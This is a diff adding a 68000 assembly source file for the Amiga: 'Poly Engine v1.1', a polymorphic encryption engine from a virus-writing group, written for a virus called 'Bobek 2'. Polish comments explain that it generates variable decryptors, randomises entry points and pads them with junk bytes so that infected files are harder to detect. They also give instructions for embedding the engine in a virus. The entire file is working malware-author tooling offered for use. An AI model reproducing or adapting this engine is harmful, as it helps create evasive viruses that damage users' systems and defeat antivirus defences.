@@ -1,0 +1,503 @@
+;==============================================================================
+;      Poly Engine v1.1 by MaD roGEr/Viruses'R'US, (c) 2001, South Poland
+;==============================================================================
+;
+;Ten generator zostal napisany specjalnie dla wirusa Bobek 2.
+;
+;Rozmiar generatora: 720 bajtow
+;
+;Generator tworzy zmienne procedury deszyfrujace o stalej dlugosci 128 bajtow.
+;Jako generator liczb losowych zostal uzyty rejestr $dff007, w odroznieniu od 
+;algorytmu sprawdzonego na poprzednich generatorach polimorficznych serii
+;Mutagen i PE 1.0. 
+;Ten generator  zostal napisany calkowicie od nowa, zaniechane zostaly tez
+;wszelkie prace nadgeneratorami dzialajacymi w dotychczasowy sposob.
+;Druga istotna cecha jest mozliwosc uzycia tego generatora do szyfrowania
+;wirusa w pamieci w polimorficzny sposob, moze to znacznie utrudnic jego
+;wykrycie. W zadnym dotychczas napisanym wirusie Amigi nie zastosowano tez
+;innego punktu wejscia (eng. Entry_Point) niz poczatek dekodera.
+;Tutaj i adres wejscia, i adres skoku do rozszyfrowanego kodu wirusa
+;sa calkowicie niezalezne i moga zostac umieszczone gdziekolwiek w kodzie
+;dekodera. Tak naprawde generator ten jest jedynie przymiarka do znacznie
+;wiekszego projektu, byc moze juz za 2 - 3 miesiace ukaze sie pierwszy,
+;metamorficzny wirus Amigi.
+;
+;
+;Input regs:
+;-----------
+; A0.L - skad brac kod do zaszyfrowania
+; A1.L - gdzie umiescic zaszyfrowany kod razem z dekoderem (rozmiar:D0 + 128 b.)
+; D0.W - dlugosc kodu do zaszyfrowania
+;
+;Output regs:
+;------------
+; D0.B - entry_point (offset od poczatku bufora)
+;
+;W celu uzycia generatora w wirusie, powinienes wywolac go z parametrami
+;umieszczonymi w rejestrach... Zreszta jesli cos wiesz o wirusach, bedziesz
+;wiedzial co z tym zrobic.
+;
+;   Generator tworzy procedury szyfrujace dla wirusow stosujacych metode
+;   wirusa "Infiltrator" do infekcji plikow, tj. przez umieszczenie na poczatku
+;   1 hunka skoku do wirusa umieszczonego za 1 hunkiem. W przypadku innej
+;   metody infekcji plikow nalezy przed kodem wirusa i dekodera umiescic
+;   instrukcje skoku do startu dekodera (entry_point).
+;   Np.:
+;
+;	lea	virus(pc),a0
+;	lea	buffer+2(pc),a1
+;	move.w	#end_virus-start_virus,d0
+;	CALL	_Poly_Engine
+;	add.b	d0,-1(a1)
+;
+;
+;
+;buffer: 
+;	dc.w	$60fe	;bra -2 --
+;	[DEKODER]		 |
+;	...                      |
+;	...			 |
+;	...                      /
+;	entry_point          <--
+;	...
+;	...
+;	...
+;	...
+;	...
+;	[VIRUS]		
+;
+;=============================================================================
+
+	move.w	#code_end-code_to_encrypt,d0	;length of code to encrypt
+	lea	code_to_encrypt(pc),a0		;code to encrypt
+	lea	buffer(pc),a1			;encrypt buffer
+	bsr.s	_PE
+	rts
+
+code_to_encrypt
+
+	nop
+	nop
+	nop
+	nop
+
+	nop
+	nop
+	nop
+	rts
+code_end
+
+
+	dc.l	buffer-_PE
+_PE
+
+	movem.l	d1-a6,-(sp)
+
+	lea	tablica_argumentow(pc),a5
+	move.l	a0,code_start-tablica_argumentow(a5)
+	move.l	a1,where_to_store_crypted_code-tablica_argumentow(a5)
+	move.l	a1,a0
+	add.l	#$80,a0
+	move.l	a0,_adress_to_crypt+2-tablica_argumentow(a5)
+	move.w	d0,code_length-tablica_argumentow(a5)
+	move.b	$dff00a,arg+1-tablica_argumentow(a5)
+
+	bsr.w	CacheClear
+	move.l	a1,a0
+
+	moveq	#($80/4)-1,d1
+
+_clear_decoder_area
+	clr.l	(a1)+
+	dbf	d1,_clear_decoder_area
+
+
+	
+;=================
+;Umiesc blok CacheClearU w kodzie dekodera jako procedure
+
+
+_cache_rnd
+	bsr.w	_rnd		;pobierz losowa liczbe podzielna przez 2
+	cmp.w	#$6e,d6		;jesli wieksza niz $6e (rozmiar najwiekszego
+				;bloku czyszczacego cache + RTS) - wez mniejsza
+	bge.s	_cache_rnd
+	move.w	d6,cache_clear_offset-tablica_argumentow(a5)
+				;zachowaj offset pod ktorym jest zapisany
+				;blok czyszczacy cache procesora
+	lea	(a0,d6.w),a3	;w A3 mamy adres tego bloku
+	bsr.w	_rnd
+	and.w	#6,d6		;mamy cztery rozne bloki... 0,1,2,3
+	lea	_cache_offsets(pc),a4	;adres offsetow blokow
+	move.w	(a4,d6.w),d6		;pobierz offset bloku
+	lea	(a4,d6.w),a4		;pobierz adres bloku
+	move.w	(a4)+,d6		;pobierz rozmiar bloku
+
+_cache_loop
+	move.b	(a4)+,(a3)+		;skopiuj go do dekodera
+	subq.w	#1,d6
+	bne.s	_cache_loop
+
+	move.w	#$4e75,(a3)+	;umiesc RTS na koncu aby mozna go bylo
+				;wywolac instrukcja BSR lub jsr
+;=====================
+;Ustal offset poczatku dekodera (entry point)
+
+_e_ptr_rnd
+	bsr.w	_rnd		;pobierz offset poczatku dekodera (entry_point)
+
+	moveq	#6,d0
+	bsr.w	_check_free_space
+
+				;sprawdz czy mozna tam umiescic instrukcje
+				;(musi byc miejsce na instrukcje i skok do
+				;nastepnej)
+	bne.s	_e_ptr_rnd
+	
+	move.w	d6,entry_offset-tablica_argumentow(a5)
+				;zachowaj na potem...
+
+;====================
+;Umiesc rejestry na stosie
+
+	lea	(a0,d6.w),a3
+	move.l	#$48e7fffe,(a3)+;wstaw MOVEM.L D0-A6,-(SP)
+	moveq	#8,d0		
+	bsr.w	get_offset	;znajdz adres nastepnego bloku, a za aktualnie
+				;generowana instrukcja wstaw BRA, w rejestrze
+				;D0 podajemy minimalna ilosc zerowych
+				;bajtow jaka musi byc pod tym adresem	
+
+;===================
+;Umiesc instrukcje LEA lub PEA w dekoderze
+
+	lea	(a0,d6.w),a3	;adres nastepnego bloku
+	lea	_lea_offsets(pc),a4	;offsety instrukcji LEA, PEA
+	bsr.w	_rnd2		;pobierz losowa liczbe
+	and.w	#2,d6		;0,1
+	move.w	(a4,d6.w),d6		;pobierz offset bloku
+	lea	(a4,d6.w),a4		;pobierz adres bloku
+	move.w	(a4)+,d6		;pobierz rozmiar bloku
+	subq.w	#4,d6
+
+	move.l	(a4)+,(a3)+
+	move.l	a3,d2			;oblicz offset dla instrukcji PEA, LEA
+	move.l	a0,d1			;
+	move.w	#$80,d0			;
+	sub.w	d1,d2			;
+	sub.w	d2,d0			;
+	addq.w	#4,d0
+	add.w	d0,-2(a3)		;zapisz do dekodera
+	tst.w	d6			;sprawdz czy kopiowanie bloku zakonczone
+	beq.s	Inicjuj_licznik_petli	;jesli tak, generuj nastepna instrukcje
+
+	move.w	(a4)+,(a3)+
+
+;=================
+Inicjuj_licznik_petli
+
+	moveq	#6,d0
+	bsr.w	get_offset
+	lea	(a0,d6.w),a3
+	move.w	#$343c,(a3)+		;move.w	#code_length,d2
+	move.w	code_length(pc),(a3)+
+
+;==================
+;umiesc argument (dla niektorych instrukcji szyfrujacych nieistotny)
+
+	moveq	#6,d0
+	bsr.w	get_offset
+	lea	(a0,d6.w),a3
+	move.w	#$123c,(a3)+		;move.b	#arg,d1
+	move.w	arg(pc),(a3)+
+
+;================
+;generuj petle dekodujaca
+
+	moveq	#4,d0
+	bsr.w	get_offset
+	move.w	d6,loop_offset-tablica_argumentow(a5)
+	lea	(a0,d6.w),a3
+	move.w	#$1010,(a3)+		;move.b	(a0),d0	
+
+	moveq	#4,d0
+	bsr.w	get_offset
+	lea	(a0,d6.w),a3
+
+	bsr.w	_rnd2
+	lsl.w	#2,d6			;konwertuj na dlugie slowo
+	lea	_crypt_blocks(pc),a4	;adres instrukcji do uzycia w dekoderze
+	lea	crypt_instr(pc),a2	;adres instrukcji w procedurze
+					;szyfrujacej wirusa
+	move.l	(a4,d6.w),d0		;pobierz instrukcje (2)
+	move.w	d0,(a2)			;jedna skopiuj do procedury szyfrujacej
+	swap	d0	
+	move.w	d0,(a3)+		;a druga do dekodera
+
+	moveq	#4,d0
+	bsr.s	get_offset
+	lea	(a0,d6.w),a3
+	move.w	#$10c0,(a3)+		;move.b	d0,(a0)+
+
+;================
+;oks :) mamy juz petle
+		
+	moveq	#6,d0
+	bsr.s	get_offset
+	lea	(a0,d6.w),a3
+	move.w	loop_offset(pc),d5
+	sub.w	d6,d5			;oblicz offset skoku petli
+	move.w	#$5342,(a3)+		;subq.w	#1,d2
+	bsr.w	_rnd2
+	and.w	#6,d6
+	lea	_loop_blocks(pc),a4
+	move.w	(a4,d6.w),d6
+	add.b	d5,d6
+	subq.b	#2,d6
+
+;================
+;jeszcze tylko skok
+	move.w	d6,(a3)+		;bge, bpl, bhi, bne
+
+;===============
+;i gotowe...
+
+;===============
+;call CacheClearU()
+
+	moveq	#4,d0
+	bsr.s	get_offset
+	lea	(a0,d6.w),a3
+	move.w	#$61fe,d0	 	;bsr CacheClearU()
+	sub.w	cache_clear_offset(pc),d6
+	sub.b	d6,d0
+	move.w	d0,(a3)+		;umiesc skok do Cache_block w dekoderze
+	move.w	#$80,d0			;oblicz przesuniecie skoku do kodu
+	move.w	a3,d2			;wirusa
+	move.w	a0,d1			;
+	sub.w	d1,d2			;
+	sub.w	d2,d0			;
+	subq.w	#2,d0
+	move.w	#$6000,(a3)		;zapisz BRA.b
+	move.b	d0,1(a3)		;zapisz offset
+	bsr.w	_shitter		;wypelnij puste miejsca smieciami
+	move.w	code_length(pc),d0
+	move.l	code_start(pc),a1
+	move.l	_adress_to_crypt+2(pc),a2
+_copy_loop
+	move.b	(a1)+,(a2)+		;skopiuj virusa do bufora
+	subq.w	#1,d0
+	bne.s	_copy_loop
+
+	bsr.s	CacheClear	
+	bsr.s	crypt_routine		;zaszyfruj...
+	move.w	entry_offset(pc),d0	;jeszcze tylko zwroc offset entry_point
+	movem.l	(sp)+,d1-a6	
+	rts				;READY_
+	
+;==============
+
+
+;----------------
+get_offset
+	move.w	#$6000,(a3)		;bra.b 0
+
+_get_offset_rnd
+	bsr.s	_rnd
+
+	bsr.s	_check_free_space
+	bne.s	_get_offset_rnd
+
+	lea	(a0,d6.w),a1
+	move.l	a1,d0
+	move.l	a3,d1
+	
+	sub.l	d1,d0
+	subq.w	#2,d0	
+	tst.b	d0
+	beq.s	_insert_NOP
+	move.b	d0,1(a3)
+	rts
+
+_insert_NOP
+	move.w	#$4e71,(a3)
+	rts
+;-------------------
+_rnd
+	moveq	#$7e,d7
+	move.b	$dff007,d6
+	and.l	d7,d6
+	rts
+;--------------------
+_rnd2
+	moveq	#7,d7
+	bra.s	_rnd+2
+;--------------------
+_check_free_space
+	move.w	d0,d1
+	add.w	d6,d1
+	
+_check_space_loop
+	tst.b	(a0,d1.w)
+	bne.s	_no_space
+	subq.w	#1,d1
+	cmp.w	d6,d1
+	bne.s	_check_space_loop
+	moveq	#0,d1
+	rts
+
+_no_space
+	moveq	#-1,d1
+	rts	
+;----------------------------------
+crypt_routine
+
+_adress_to_crypt
+	move.l	#$0,a0
+	move.w	code_length(pc),d2
+	move.w	arg(pc),d1
+
+crypt_loop
+	move.b	(a0),d0
+crypt_instr
+	dc.w	0
+	move.b	d0,(a0)+
+	subq.w	#1,d2
+	bne.s	crypt_loop
+
+CacheClear
+	move.l	4.w,a6
+	movem.l	d0/d1/a0/a1,-(sp)
+	jsr	-636(a6)	;CahceClearU()
+	movem.l	(sp)+,d0/d1/a0/a1
+	rts
+;----------------------------
+_shitter ;really cool labelname :)
+
+	lea	_PE(pc),a1
+	move.w	#128,d0
+
+_shit_loop
+	addq.l	#2,a1
+	tst.w	(a0,d0.w)
+	beq.s	_add_shit
+
+_do_shit_loop
+	subq.w	#2,d0
+	bne.s	_shit_loop
+
+	rts
+_add_shit
+	move.w	(a1)+,(a0,d0.w)
+	bra.s	_do_shit_loop	
+
+;----------------------------
+_cache_offsets
+	dc.w	_cache_block1-_cache_offsets
+	dc.w	_cache_block2-_cache_offsets
+	dc.w	_cache_block3-_cache_offsets
+	dc.w	_cache_block4-_cache_offsets
+
+_lea_offsets
+	dc.w	_lea_block1-_lea_offsets
+	dc.w	_lea_block2-_lea_offsets
+
+
+;Crypt_instructions
+;----------------------------
+_crypt_blocks
+	eor.b	d1,d0	;1
+	eor.b	d1,d0
+	add.b	d1,d0	;2
+	sub.b	d1,d0
+	rol.b	d1,d0	;3
+	ror.b	d1,d0
+	not.b	d0	;4
+	not.b	d0
+	neg.b	d0	;5
+	neg.b	d0
+	ror.b	#1,d0	;6
+	rol.b	#1,d0
+	rol.b	#1,d0	;7
+	ror.b	#1,d0
+	addq.b	#1,d0	;8
+	subq.b	#1,d0	
+
+;Loop instructions
+;---------------------------
+_loop_blocks
+	bne.s	*
+	bpl.s	*
+	bge.s	*
+	bhi.s	*
+	
+;Lea blocks
+;----------------------------
+_lea_block1
+	dc.w	4
+	lea	0(pc),a0
+_lea1_end
+;----------------------------
+_lea_block2
+	dc.w	6
+	pea	0(pc)
+	move.l	(sp)+,a0
+_lea2_end
+;----------------------------
+
+;Cache blocks	
+;----------------------------
+_cache_block1
+	dc.w	_cache1_end-_cache_block1-2
+	move.l	4.w,a6
+	jsr	-636(a6)
+_cache1_end
+;----------------------------
+_cache_block2
+	dc.w	_cache2_end-_cache_block2-2
+	lea	4.w,a6
+	move.l	(a6),a6
+	move.l	-634(a6),a0
+	jsr	(a0)
+_cache2_end
+;----------------------------
+_cache_block3
+	dc.w	_cache3_end-_cache_block3-2
+	move.l	4.w,-(sp)
+	move.l	(sp)+,a6
+	pea	+8(pc)
+	jmp	-636(a6)
+_cache3_end
+;----------------------------
+_cache_block4
+	dc.w	_cache4_end-_cache_block4-2
+	move.l	4.w,a6
+	lea	-634(a6),a0
+	move.l	(a0),a0
+	jsr	(a0)
+_cache4_end
+;----------------------------
+
+
+
+
+		dc.b	'[PE v1.1 by MaD roGEr/VRU]'
+
+
+
+
+
+tablica_argumentow
+
+arg				dc.w	0
+loop_offset			dc.w	0
+where_to_store_crypted_code	dc.l	0
+code_start			dc.l	0
+code_length			dc.w	0
+cache_clear_offset		dc.w	0
+entry_offset			dc.w	0
+
+buffer
+;	blk.l	$604
+
+
